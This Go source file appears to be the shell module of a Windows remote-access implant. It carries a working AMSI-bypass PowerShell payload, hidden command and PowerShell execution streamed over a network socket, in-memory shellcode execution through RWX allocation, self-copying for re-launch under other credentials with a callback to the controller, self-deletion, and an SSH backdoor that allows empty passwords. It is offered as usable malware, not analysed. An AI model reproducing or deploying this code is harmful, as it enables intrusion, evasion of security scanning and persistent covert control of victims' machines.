package shell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"unsafe"
	"io/ioutil"
	"encoding/base64"
	
	"../utils"
)

const (
	memCommit            = 0x1000
	memReserve           = 0x2000
	pageExecuteReadWrite = 0x40
)

var (
	kernel32         = syscall.MustLoadDLL(utils.Bake("§kernel32.dll§"))
	ntdll            = syscall.MustLoadDLL(utils.Bake("§ntdll.dll§"))
	VirtualAlloc     = kernel32.MustFindProc(utils.Bake("§VirtualAlloc§"))
	RtlCopyMemory    = ntdll.MustFindProc(utils.Bake("§RtlCopyMemory§"))
	procSetStdHandle = kernel32.MustFindProc(utils.Bake("§SetStdHandle§"))

	amsiBypass = utils.Bake(`§$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)§`)
)
const (
	sshd = `§sshd.exe§`
)
// SetStdHandle https://docs.microsoft.com/de-de/windows/console/setstdhandle
func SetStdHandle(stdhandle int32, handle syscall.Handle) error {
	r0, _, e1 := syscall.Syscall(procSetStdHandle.Addr(), 2, uintptr(stdhandle), uintptr(handle), 0)
	if r0 == 0 {
		if e1 != 0 {
			return error(e1)
		}
		return syscall.EINVAL
	}
	return nil
}

// Shell ...
func Shell() *exec.Cmd {
	cmd := exec.Command(utils.Bake("§C:\\Windows\\System32\\cmd.exe§"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// Powershell ...
func Powershell() (*exec.Cmd, error) {
	cmd := exec.Command(utils.Bake("§C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe§"), "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd, nil
}

// ExecShell ...
func ExecShell(command string, c net.Conn) {
	cmd := exec.Command(utils.Bake("§\\Windows\\System32\\cmd.exe§"), "/c", command+"\n")
	rp, wp := io.Pipe()
	cmd.Stdin = c
	cmd.Stdout = wp
	go io.Copy(c, rp)
	cmd.Run()
}

// Exec ...
func Exec(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecPS ...
func ExecPS(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(path, "-exec", "bypass", "-command", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

// ExecOut execute a command and retrieves the output
func ExecOut(command string) (string, error) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecPSOut execute a ps command and retrieves the output
func ExecPSOut(command string, encoded bool) (string, error) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	var cmd *exec.Cmd
	if encoded {
		cmd = exec.Command(path, "-exec", "bypaSs", "-encodedcommand", command+"\n")
	} else {
		cmd = exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
	}
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}


func ExecPSOutNoAMSI(command string) (string, error) {
	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	var cmd *exec.Cmd
	cmd = exec.Command(path, "-exec", "bypaSs", "-command", amsiBypass + ";" +command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ExecDebug ...
func ExecDebug(cmd string) (string, error) {
	out, err := ExecOut(cmd)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecPSDebug ...
func ExecPSDebug(cmd string) (string, error) {
	out, err := ExecPSOut(cmd, false)
	if err != nil {
		log.Println(err)
		return err.Error(), err
	}
	fmt.Printf("%s\n", strings.TrimLeft(strings.TrimRight(out, "\r\n"), "\r\n"))
	return out, err
}

// ExecSilent ...
func ExecSilent(command string, c net.Conn) {
	path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// ExecSC executes Shellcode
func ExecSC(sc []byte) {
	// ioutil.WriteFile("met.dll", sc, 0644)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), memCommit|memReserve, pageExecuteReadWrite)
	if addr == 0 {
		log.Println(err)
		return
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	// this "error" will be "Operation completed successfully"
	log.Println(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// RunAs will rerun the as as the user we specify
func RunAs(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	err := CreateProcessWithLogon(user, pass, domain, path, cmd)
	if err != nil {
		fmt.Println(err)
		return
	}
	c.Close()
	return
}

// RunAsPS ...
func RunAsPS(user string, pass string, domain string, c net.Conn) {
	path := CopySelf()
	ip, port := utils.SplitAddress(c.RemoteAddr().String())
	cmd := fmt.Sprintf("%s %s %s", path, ip, port)

	cmdLine := ""
	cmdLine += fmt.Sprintf("$user = '%s\\%s';", domain, user)
	cmdLine += fmt.Sprintf("$password = '%s';", pass)
	cmdLine += fmt.Sprintf("$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;")
	cmdLine += fmt.Sprintf("$credential = New-Object System.Management.Automation.PSCredential $user,$securePassword;")
	cmdLine += fmt.Sprintf("$session = New-PSSession -Credential $credential;")
	cmdLine += fmt.Sprintf("Invoke-Command -Session $session -ScriptBlock {%s};", cmd)

	_, err := ExecPSOut(cmdLine, false)
	if err != nil {
		c.Write([]byte(fmt.Sprintf("\nRunAsPS Failed: %s\n", err)))
		return
	}
	c.Close()
	return
}

// CopySelf ...
func CopySelf() string {
	currentPath := os.Args[0]
	// random name
	name := utils.RandSeq(8)
	path := fmt.Sprintf("C:\\ProgramData\\%s", fmt.Sprintf("%s.exe", name))
	utils.CopyFile(currentPath, path)
	return path
}

// Seppuku deletes the binary on graceful exit
func Seppuku(c net.Conn) {
	binPath := os.Args[0]
	fmt.Println(binPath)
	go Exec(fmt.Sprintf("ping localhost -n 5 > nul & del %s", binPath), c)
}


func StartSSHServer(port int, c net.Conn) {
	tmpDir := "C:\\windows\\temp\\ssh_temp"
	ExecSilent(fmt.Sprintf("mkdir %s", tmpDir), c)
	hostRsaFile := fmt.Sprintf("%s\\host_rsa", tmpDir)
	hostDsaFile := fmt.Sprintf("%s\\host_dsa", tmpDir)
	hostRsaPubFile := fmt.Sprintf("%s\\host_rsa.pub", tmpDir)
	hostDsaPubFile := fmt.Sprintf("%s\\host_dsa.pub", tmpDir)
	pidFile := fmt.Sprintf("%s\\sshd.pid", tmpDir)
	authKeyFile := fmt.Sprintf("%s\\key_pub", tmpDir)

	utils.SaveRaw(hostRsaFile, host_rsa)
	utils.SaveRaw(hostDsaFile, host_dsa)
	utils.SaveRaw(hostRsaPubFile, host_rsa_pub)
	utils.SaveRaw(hostDsaPubFile, host_dsa_pub)
	utils.SaveRaw(authKeyFile, key_pub)
	utils.SaveRaw(pidFile, "0")

	user, err := user.Current()
	if err != nil {
		log.Println(err.Error())
		return
	}
	username := strings.Split(user.Username, "\\")[1]

	for _, f := range []string{hostDsaFile,hostRsaFile,hostRsaPubFile,hostDsaPubFile,pidFile,authKeyFile} {
		path := fmt.Sprintf("%s", f)
		ExecSilent(fmt.Sprintf("icacls %s /grant:r %s:f /inheritance:r", path, username), c)
	}

	config := ""
	config += fmt.Sprintf("Port %d\n", port)
	config += "ListenAddress 0.0.0.0\n"
	config += fmt.Sprintf("HostKey %s\n", hostRsaFile)
	config += fmt.Sprintf("HostKey %s\n", hostDsaFile)
	config += "PubkeyAuthentication yes\n"
	config += fmt.Sprintf("AuthorizedKeysFile %s\n", authKeyFile)
	config += "PasswordAuthentication yes\n"
	config += "PermitEmptyPasswords yes\n"
	config += "GatewayPorts yes\n"
	config += fmt.Sprintf("PidFile %s\n", pidFile)
	config += "Subsystem	sftp	sftp-server.exe\n"
	config += "Match Group administrators\n"
	config += fmt.Sprintf("\tAuthorizedKeysFile %s\n", authKeyFile)

	utils.SaveRaw(fmt.Sprintf("%s\\sshd_config", tmpDir), config)

	sshdbin, _ := base64.StdEncoding.DecodeString(sshd)
	err = ioutil.WriteFile(fmt.Sprintf("%s\\sshd.exe", tmpDir),sshdbin, 0644)
	if err != nil {
		log.Println(err)
		return
	}
	c.Write([]byte(fmt.Sprintf("Starting SSH server on port %d\n", port)))
	go func() {
		for {
			// will terminate whenever a user connects and then reconnects
			_, err = ExecOut(fmt.Sprintf("%s/sshd.exe -f %s/sshd_config -E %s/log.txt -d", tmpDir, tmpDir, tmpDir))
			if err == nil {
				// pass
			} else {
				//c.Write([]byte("Restarted SSH server\n"))
			}
		}
	}()
}
